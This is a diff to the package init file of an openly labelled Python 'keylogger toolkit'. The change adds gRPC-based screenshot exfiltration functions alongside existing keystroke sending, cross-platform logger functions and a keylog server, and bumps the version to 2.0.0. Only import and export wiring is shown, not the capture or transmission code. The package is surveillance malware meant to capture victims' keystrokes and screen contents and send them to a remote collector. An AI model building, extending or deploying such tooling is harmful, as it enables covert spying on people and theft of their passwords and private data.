@@ -6,6 +6,9 @@ _os = platform.system().lower()
 # Common imports (work on all platforms)
 from .grpc_serve import KeylogServer
 from .cln import send_key_non_blocking as send_key
+from .cln import send_screenshot_non_blocking as send_screenshot
+from .cln import send_screenshot_bytes_non_blocking as send_screenshot_bytes
+from .cln import configure as configure_client
 from .capture import take_screenshot as global_screencapture
 
 # Platform-specific imports - only import what works on current OS
@@ -29,13 +32,16 @@ elif 'windows' in _os:
 
 __all__ = [
     'send_key',
+    'send_screenshot',
+    'send_screenshot_bytes',
+    'configure_client',
     'loggerFunctionLinux',
     'loggerFunctionMac',
     'loggerFunctionWindows',
     'global_screencapture',
     'KeylogServer',
 ]
-__version__ = '1.0.0'
+__version__ = '2.0.0'
 __author__ = 'pengux8 (aka) wail sari bey'
-__description__ = 'keylogger toolkit'
+__description__ = 'keylogger toolkit with gRPC screenshot exfiltration'
 
